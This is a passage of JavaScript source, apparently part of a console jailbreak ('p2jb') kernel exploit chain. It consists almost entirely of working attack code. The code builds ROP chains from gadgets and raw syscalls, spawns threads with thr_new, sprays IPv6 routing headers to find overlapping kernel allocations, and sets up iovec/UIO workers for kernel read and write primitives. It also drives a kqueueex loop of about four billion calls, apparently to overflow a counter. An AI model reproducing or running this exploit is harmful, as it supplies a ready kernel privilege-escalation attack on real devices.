                DATA_BASE_SECURITY_FLAGS: fw.DATA_BASE_SECURITY_FLAGS || null,
                DATA_BASE_KERNEL_PMAP_STORE: fw.DATA_BASE_KERNEL_PMAP_STORE || null,
                DATA_BASE_GVMSPACE: fw.DATA_BASE_GVMSPACE || null,
                DATA_BASE_TARGET_ID: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x09n : null,
                DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x24n : null,
                DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn : null,
            };
        }

        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        let failcheck_path = null;

        function my_init_threading() {
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
        }

        function spawn_leak_worker(chain_addr) {
            // Zero a scratch buffer and fill all jmpbuf slots with it so callee-saved
            // registers (RBX, RBP, R12-R15) have a valid pointer after longjmp, not
            // uninitialized malloc garbage that would fault on first use.
            const scratch = malloc(0x100);
            for (let i = 0; i < 0x100; i += 8) write64_uncompressed(scratch + BigInt(i), 0n);
            const jb = malloc(0x60);
            for (let i = 0; i < 0x60; i += 8) write64_uncompressed(jb + BigInt(i), scratch);

            write64_uncompressed(jb + 0x00n, g.get('ret'));
            write64_uncompressed(jb + 0x10n, chain_addr);
            write32_uncompressed(jb + 0x40n, BigInt(saved_fpu_ctrl));
            write32_uncompressed(jb + 0x44n, BigInt(saved_mxcsr));

            const stack_size = 0x400n;
            const tls_size = 0x40n;
            // Zero thr_new_args so flags[0x40] and rtp[0x48] are 0, not garbage that
            // could set THR_SUSPENDED or cause a kernel dereference of a junk rtp pointer.
            const thr_new_args = malloc(0x80);
            for (let i = 0; i < 0x80; i += 8) write64_uncompressed(thr_new_args + BigInt(i), 0n);
            const tid_addr = malloc(0x8);
            const cpid = malloc(0x8);
            const stack = malloc(Number(stack_size));
            const tls = malloc(Number(tls_size));

            write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);
            write64_uncompressed(thr_new_args + 0x08n, jb);
            write64_uncompressed(thr_new_args + 0x10n, stack);
            write64_uncompressed(thr_new_args + 0x18n, stack_size);
            write64_uncompressed(thr_new_args + 0x20n, tls);
            write64_uncompressed(thr_new_args + 0x28n, tls_size);
            write64_uncompressed(thr_new_args + 0x30n, tid_addr);
            write64_uncompressed(thr_new_args + 0x38n, cpid);

            const ret = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (ret !== 0n) fail("leak worker thr_new failed: " + toHex(ret));
            const tid = read64_uncompressed(tid_addr);
            return tid;
        }

        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;

            // Allocate the chain buffer and keep the ArrayBuffer reference so we can
            // write gadgets via a BigUint64Array view, bypassing write64_uncompressed, avoiding gc
            const buf = malloc(STACK_SIZE);
            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
            const chain_view = new BigUint64Array(chain_ab);
            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
            chain_view.fill(0n, 0, 0x800);

            const entry = buf + 0x4000n;
            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts

            const mask = malloc(0x10);
            write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
            write64_uncompressed(mask + 0x8n, 0n);

            let idx = 0;
            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
            // at() converts a slot index to its in-memory address.
            // Only called in repairSlot (~20k times), not in the emit hot path.
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.read);
            emit(ROP.pop_rdi); emit(BigInt(pipe_rfd));
            emit(ROP.pop_rsi); emit(dummybuf);
            emit(ROP.pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const kqBase = [];
            for (let k = 0; k < unroll; k++) {
                kqBase.push(idx);
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(readBase + 0, ROP.pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, ROP.pop_rdi);
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, ROP.pop_rsi);
            repairSlot(readBase + 5, dummybuf);
            repairSlot(readBase + 6, ROP.pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            for (let k = 0; k < unroll; k++) {
                const b = kqBase[k];
                repairSlot(b + 0, ROP.pop_rax);
                repairSlot(b + 1, SYSCALL.kqueueex);
                repairSlot(b + 2, ROP.pop_rdi);
                repairSlot(b + 3, POC_ARG);
                repairSlot(b + 4, syscall_wrapper);
            }

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT = idx;
            for (let k = 0; k < remainder; k++) {
                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
                emit(ROP.pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(ROP.ret);
            }
            emit(ROP.pop_rax); emit(EXIT_MARK);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function fail(msg) { throw new Error("p2jb: " + msg); }

        function sched_yield_n(n) {
            for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8_uncompressed(buf, 0n);
            write8_uncompressed(buf + 1n, BigInt(len));
            write8_uncompressed(buf + 2n, 0n);
            write8_uncompressed(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }
        function set_rthdr(sd, buf, len) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                buf, BigInt(len));
        }
        function free_rthdr(sd) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        function make_worker_sync(n) {
            const HDR_SIZE = 8;
            const ARRAY_SIZE = 3 * n * 8;
            const raw = malloc(64 + HDR_SIZE + ARRAY_SIZE + 128);
            const align = (64n - (raw % 64n)) % 64n;
            const cmd_addr = raw + align;
            const finished_base = cmd_addr + 8n;
            const awake_base = finished_base + BigInt(n * 8);

            write64_uncompressed(cmd_addr, 0n);
            for (let i = 0; i < n; i++) {
                write64_uncompressed(finished_base + BigInt(i * 8), 0n);
                write64_uncompressed(awake_base + BigInt(i * 8), 0n);
            }

            const ws = {
                n,
                cmd: cmd_addr,
                gen: 0n,
                finished: finished_base,
                awake: awake_base,

                wait_val_slots: new Array(n).fill(0n),
                pivot_slots: new Array(n).fill(0n),
                exit_addrs: new Array(n).fill(0n),
                signal() {
                    const next = this.gen + 1n;
                    this.gen = next;

                    for (let i = 0; i < n; i++) {
                        write64_uncompressed(this.finished + BigInt(i * 8), 0n);
                        write64_uncompressed(this.awake + BigInt(i * 8), 0n);
                    }

                    for (let i = 0; i < n; i++) {
                        write64_uncompressed(this.wait_val_slots[i], next);
                    }

                    write64_uncompressed(this.cmd, next);

                    const deadline = Date.now() + 5000;
                    while (true) {
                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE,
                            0x7FFFFFFFn, 0n, 0n);
                        let all_awake = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64_uncompressed(this.awake + BigInt(i * 8)) === 0n) {
                                all_awake = false; stuck = i; break;
                            }
                        }
                        if (all_awake) break;
                        if (Date.now() > deadline)
                            fail("worker_sync.signal: WAKE timeout - worker " +
                                stuck + "/" + n + " never reached WAIT exit");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                wait(timeout_ms) {

                    const deadline = Date.now() + (timeout_ms || 15000);
                    while (true) {
                        let done = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64_uncompressed(this.finished + BigInt(i * 8)) === 0n) {
                                done = false; stuck = i; break;
                            }
                        }
                        if (done) return;
                        if (Date.now() > deadline)
                            fail("worker_sync.wait: timeout - worker " + stuck +
                                "/" + n + " stalled (no response in 15s)");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                terminate() {

                    for (let i = 0; i < n; i++) {
                        write64_uncompressed(this.pivot_slots[i], this.exit_addrs[i]);
                    }
                    this.signal();
                    this.wait();
                },
            };
            return ws;
        }

        function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
            const STACK_SIZE = 0x10000;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64_uncompressed(buf + k, 0n);
            const entry = buf + 0x4000n;

            const cmd_addr = ws.cmd;
            const awake_addr = ws.awake + BigInt(wid * 8);
            const finished_addr = ws.finished + BigInt(wid * 8);
            const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;

            let idx = 0;
            const emit = (v) => { write64_uncompressed(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const waitBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.umtx_op);
            emit(ROP.pop_rdi); emit(cmd_addr);
            emit(ROP.pop_rsi); emit(UMTX_OP_WAIT);
            emit(ROP.pop_rdx); emit(0n);
            emit(ROP.pop_rcx); emit(0n);
            emit(ROP.pop_r8); emit(0n);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const wait_val_slot = at(waitBase + 7);

            const awakeBase = idx;
            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(awake_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.ret);

            const workBase = idx;
            emit(ROP.pop_rax); emit(sysnum);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(count_arg);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(waitBase + 0, ROP.pop_rax);
            repairSlot(waitBase + 1, SYSCALL.umtx_op);
            repairSlot(waitBase + 2, ROP.pop_rdi);
            repairSlot(waitBase + 3, cmd_addr);
            repairSlot(waitBase + 4, ROP.pop_rsi);
            repairSlot(waitBase + 5, UMTX_OP_WAIT);
            repairSlot(waitBase + 6, ROP.pop_rdx);

            repairSlot(waitBase + 8, ROP.pop_rcx);
            repairSlot(waitBase + 9, 0n);
            repairSlot(waitBase + 10, ROP.pop_r8);
            repairSlot(waitBase + 11, 0n);
            repairSlot(waitBase + 12, syscall_wrapper);
            repairSlot(awakeBase + 0, ROP.pop_rax);
            repairSlot(awakeBase + 1, 1n);
            repairSlot(awakeBase + 2, ROP.pop_rdi);
            repairSlot(awakeBase + 3, awake_addr);
            repairSlot(awakeBase + 4, ROP.mov_qword_rdi_rax);
            repairSlot(workBase + 0, ROP.pop_rax);
            repairSlot(workBase + 1, sysnum);
            repairSlot(workBase + 2, ROP.pop_rdi);
            repairSlot(workBase + 3, BigInt(fd));
            repairSlot(workBase + 4, ROP.pop_rsi);
            repairSlot(workBase + 5, iov_ptr);
            repairSlot(workBase + 6, ROP.pop_rdx);
            repairSlot(workBase + 7, count_arg);
            repairSlot(workBase + 8, syscall_wrapper);

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const pivotSlotIdx = idx;
            emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT_START = idx;
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return {
                entry,
                wait_val_slot,
                pivotAddr: at(pivotSlotIdx),
                exitAddr: at(EXIT_START),
            };
        }

        function make_state() {
            return {
                triplets: [-1, -1, -1],
                free_fds: [],
                free_fd_idx: 0,
                active_uio_mode: 0,
                OFF: kernel_offset,
            };
        }

        function setup_cpu_masks(S) {
            S.cpu_mask = malloc(16);
            for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0n);
            write16_uncompressed(S.cpu_mask, BigInt(1 << MAIN_CORE));

            S.rt_params = malloc(4);
            write16_uncompressed(S.rt_params, PRI_REALTIME);
            write16_uncompressed(S.rt_params + 2n, BigInt(MAIN_RTPRIO));
        }

        function apply_main_thread_pinning(S) {
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
        }

        function get_current_core() {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8_uncompressed(mask + BigInt(i), 0n);
            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
            let num = Number(read32_uncompressed(mask));
            let position = 0;
            while (num > 0) { num = num >>> 1; position += 1; }
            return position - 1;
        }

        function pin_to_core(core) {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8_uncompressed(mask + BigInt(i), 0n);
            write16_uncompressed(mask, BigInt(1 << core));
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
        }

        function get_current_ip() {
            // Get interface count
            const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
            if (count < 0) {
                return null;
            }

            // Allocate buffer for interfaces
            const iface_size = 0x1e0;
            const iface_buf = malloc(iface_size * count);

            // Get interface list
            if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
                return null;
            }

            // Parse interfaces
            for (let i = 0; i < count; i++) {
                const offset = BigInt(i * iface_size);

                // Read interface name (null-terminated string at offset 0)
                let iface_name = "";
                for (let j = 0; j < 16; j++) {
                    const c = Number(read8_uncompressed(iface_buf + offset + BigInt(j)));
                    if (c === 0) break;
                    iface_name += String.fromCharCode(c);
                }

                // Read IP address (4 bytes at offset 0x28)
                const ip_offset = offset + 0x28n;
                const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
                const ip2 = Number(read8_uncompressed(iface_buf + ip_offset + 1n));
                const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
                const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
                const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;

                // Check if this is eth0 or wlan0 with valid IP
                if ((iface_name === "eth0" || iface_name === "wlan0") &&
                    iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
                    return iface_ip;
                }
            }

            return null;
        }

        function setup_worker_sockets(S) {
            const sv1 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv1);
            S.iov_sock_a = Number(read32_uncompressed(sv1));
            S.iov_sock_b = Number(read32_uncompressed(sv1 + 4n));

            const sv2 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
            S.uio_sock_a = Number(read32_uncompressed(sv2));
            S.uio_sock_b = Number(read32_uncompressed(sv2 + 4n));
        }

        function setup_iov_buffers(S) {
            S.recvmsg_iovecs = malloc(MSG_IOV_NUM * 16);
            for (let i = 0; i < MSG_IOV_NUM * 16; i += 8) {
                write64_uncompressed(S.recvmsg_iovecs + BigInt(i), 0n);
            }

            write64_uncompressed(S.recvmsg_iovecs, 1n);
            write64_uncompressed(S.recvmsg_iovecs + 8n, 1n);

            S.recvmsg_hdr = malloc(0x38);
            for (let i = 0; i < 0x38; i += 8) write64_uncompressed(S.recvmsg_hdr + BigInt(i), 0n);
            write64_uncompressed(S.recvmsg_hdr + 0x10n, S.recvmsg_iovecs);
            write32_uncompressed(S.recvmsg_hdr + 0x18n, BigInt(MSG_IOV_NUM));
        }

        function setup_uio_buffers(S) {
            S.uio_read_buf = malloc(64);
            for (let i = 0; i < 64; i += 8) {
                write64_uncompressed(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            }
            S.uio_write_buf = malloc(64);

            S.uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64_uncompressed(S.uio_iov_read + BigInt(i), 0n);
            }
            write64_uncompressed(S.uio_iov_read, S.uio_read_buf);
            write64_uncompressed(S.uio_iov_read + 8n, 8n);

            S.uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64_uncompressed(S.uio_iov_write + BigInt(i), 0n);
            }
            write64_uncompressed(S.uio_iov_write, S.uio_write_buf);
            write64_uncompressed(S.uio_iov_write + 8n, 8n);

            S.kread_result_bufs = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) S.kread_result_bufs.push(malloc(64));

            S.kread_sndbuf = malloc(4);
            S.kwrite_sndbuf = malloc(4);

            S.scratch = malloc(16);
            S.scratch_big = malloc(0x4000);
            for (let i = 0; i < 0x4000; i += 8) write64_uncompressed(S.scratch_big + BigInt(i), 0n);
            S.dummy_byte = malloc(8);
            S.len_out = malloc(4);
            S.rthdr_readback = malloc(360);
            for (let i = 0; i < 360; i += 8) write64_uncompressed(S.rthdr_readback + BigInt(i), 0n);
        }

        function setup_pipes_kernrw(S) {
            const [m_r, m_w] = create_pipe();
            const [v_r, v_w] = create_pipe();
            S.master_rfd = Number(m_r); S.master_wfd = Number(m_w);
            S.victim_rfd = Number(v_r); S.victim_wfd = Number(v_w);
            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
            }
        }

        function setup_workers(S) {
            S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
            S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
            S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);

            for (let i = 0; i < IOV_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                    S.cpu_mask, S.rt_params,
                );
                S.iov_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.iov_ws.pivot_slots[i] = ch.pivotAddr;
                S.iov_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_read_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_read_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_read_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_write_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_write_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_write_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
        }

        function setup_ipv6_spray(S) {
            S.ipv6_sockets = [];
            for (let i = 0; i < NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
                if (fd === 0xffffffffffffffffn) break;
                S.ipv6_sockets.push(Number(fd));
            }
            S.ipv6_count = S.ipv6_sockets.length;
            for (const fd of S.ipv6_sockets) free_rthdr(fd);
            nanosleep_ms(500);

            S.rthdr_spray = malloc(UCRED_SIZE);
            for (let i = 0; i < UCRED_SIZE; i += 8) write64_uncompressed(S.rthdr_spray + BigInt(i), 0n);
            S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE);

            S.tag_buf = malloc(16);
            S.tag_len = malloc(4);
        }

        function rthdr_set(S, idx) {
            return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
        }
        function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }
        function rthdr_get_tag(S, idx) {
            write32_uncompressed(S.tag_len, 8n);
            const r = syscall(SYSCALL.getsockopt,
                BigInt(S.ipv6_sockets[idx]),
                IPPROTO_IPV6, IPV6_RTHDR, S.tag_buf, S.tag_len);
            if (r === 0xffffffffffffffffn) return null;
            return Number(read32_uncompressed(S.tag_buf + 4n));
        }

        function find_twins(S, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                    rthdr_set(S, i);
                }
                for (let i = 0; i < S.ipv6_count; i++) {
                    const v = rthdr_get_tag(S, i);
                    if (v === null) continue;
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG && i !== j && j < S.ipv6_count) {
                        return [i, j];
                    }
                }
                if (round_ % 50 === 0) syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function find_triplet(S, master_idx, exclude_idx, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    if (i !== master_idx && i !== exclude_idx) {
                        write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                        rthdr_set(S, i);
                    }
                }
                const v = rthdr_get_tag(S, master_idx);
                if (v !== null) {
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG &&
                        j !== master_idx && j !== exclude_idx && j < S.ipv6_count) return j;
                }
                if (round_ % 100 === 0) syscall(SYSCALL.sched_yield);
            }
            return -1;
        }

        function triplets_valid(S) {
            return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
        }

        function repair_triplets(S) {
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                    if (S.triplets[1] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            if (S.triplets[2] < 0 || S.triplets[2] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                    if (S.triplets[2] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            return triplets_valid(S);
        }

        function prepare_fds(S) {
            const rl = malloc(16);
            syscall(0xC2n, 8n, rl);
            const nofile_hard = read64_uncompressed(rl + 8n);
            write64_uncompressed(rl, nofile_hard);
            write64_uncompressed(rl + 8n, nofile_hard);
            syscall(SYSCALL.setrlimit, 8n, rl);

            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"];
            let held_path = 0n;
            for (let c = 0; c < cand.length; c++) {
                const sp = alloc_string(cand[c]);
                const a = syscall(SYSCALL.open, sp, 0n);
                if (a === 0xffffffffffffffffn) continue;
                const b = syscall(SYSCALL.open, sp, 0n);
                syscall(SYSCALL.close, a);
                if (b === 0xffffffffffffffffn) continue;
                syscall(SYSCALL.close, b);
                held_path = sp;
                break;
            }
            const new_free_fd = () => held_path !== 0n
                ? syscall(SYSCALL.open, held_path, 0n)
                : syscall(SYSCALL.socket, 28n, 2n, 0n);

            const probe_fds = [];
            for (let i = 0; i < 8192; i++) {
                const pfd = new_free_fd();
                if (pfd === 0xffffffffffffffffn) break;
                probe_fds.push(pfd);
            }
            const fd_budget = probe_fds.length;
            for (let i = 0; i < probe_fds.length; i++)
                syscall(SYSCALL.close, BigInt(probe_fds[i]));

            let free_fds_num = fd_budget - 96;
            if (free_fds_num > 2048) free_fds_num = 2048;

            const R_ESTIMATE = 69 + 12 + 1 + 1;
            const BURST_MIN = R_ESTIMATE + 40;
            if (free_fds_num < BURST_MIN)
                fail("fd budget too small: free_fds_num=" + free_fds_num +
                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                    BURST_MIN + "); fd_budget=" + fd_budget);

            syscall(SYSCALL.setuid, 1n);

            nanosleep_ms(10000);

            const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);

            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const LEAK_UNROLL = 1024;
            const U = BigInt(LEAK_UNROLL);

            const NW = LEAK_CORES.length;
            const FEED_CHUNK = 4096;

            const chunkbuf = malloc(FEED_CHUNK);

            const base_share = TOTAL_SYSCALLS / BigInt(NW);
            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
            const lws = [];
            for (let w = 0; w < NW; w++) {
                const target_w = base_share + (w === 0 ? extra0 : 0n);
                const bplus1_w = target_w / U;
                const normal_w = bplus1_w - 1n;
                const remainder_w = target_w - bplus1_w * U;
                const [pr, pw] = create_pipe();
                const rfd = Number(pr), wfd = Number(pw);

                syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                const finished = malloc(8); write64_uncompressed(finished, 0n);
                const dummybuf = malloc(8);
                const chain = build_leak_worker_chain(
                    LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
                    Number(remainder_w));
                spawn_leak_worker(chain.entry);
                lws.push({
                    chain, rfd, wfd, wfd_big: BigInt(wfd),
                    rfd_big: BigInt(rfd), finished,
                    normal: normal_w, queued: 0n
                });
            }

            const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
            const _sleep_ts = malloc(16);
            write64_uncompressed(_sleep_ts,      5n);           // tv_sec  = 5
            write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0

            logger.log("prepare_fds: beginning feeding");
            _cr_enable_caching();

            let all_fed = false;
            while (!all_fed) {
                all_fed = true;
                for (const lw of lws) {
                    while (lw.queued < lw.normal) {
                        const want = (lw.normal - lw.queued) < FEED_CHUNK_BIG
                            ? (lw.normal - lw.queued) : FEED_CHUNK_BIG;
                        const n = syscall(SYSCALL.write, lw.wfd_big,
                            chunkbuf, want);
                        if (n === 0n || n > FEED_CHUNK_BIG) break;
                        lw.queued += n;
                    }
                    if (lw.queued < lw.normal) all_fed = false;
                }
                if (!all_fed) syscall(SYSCALL.nanosleep, _sleep_ts, 0n);
            }

            _cr_disable_caching();


            logger.log("feeding done, waiting for workers to finish");

            for (const lw of lws) {
                while (true) {
                    write64_uncompressed(lw.finished, 0n);
                    nanosleep_ms(1500);
                    if (read64_uncompressed(lw.finished) === 0n) break;
                }
            }
            for (const lw of lws) {
                write64_uncompressed(lw.chain.pivotAddr, lw.chain.exitAddr);
                write64_uncompressed(lw.finished, 0n);
                syscall(SYSCALL.write, lw.wfd_big, chunkbuf, 1n);
            }
            for (const lw of lws) {
                const dl = Date.now() + 15000;
                while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
                    nanosleep_ms(50);
                syscall(SYSCALL.close, lw.rfd_big);
                syscall(SYSCALL.close, lw.wfd_big);
            }

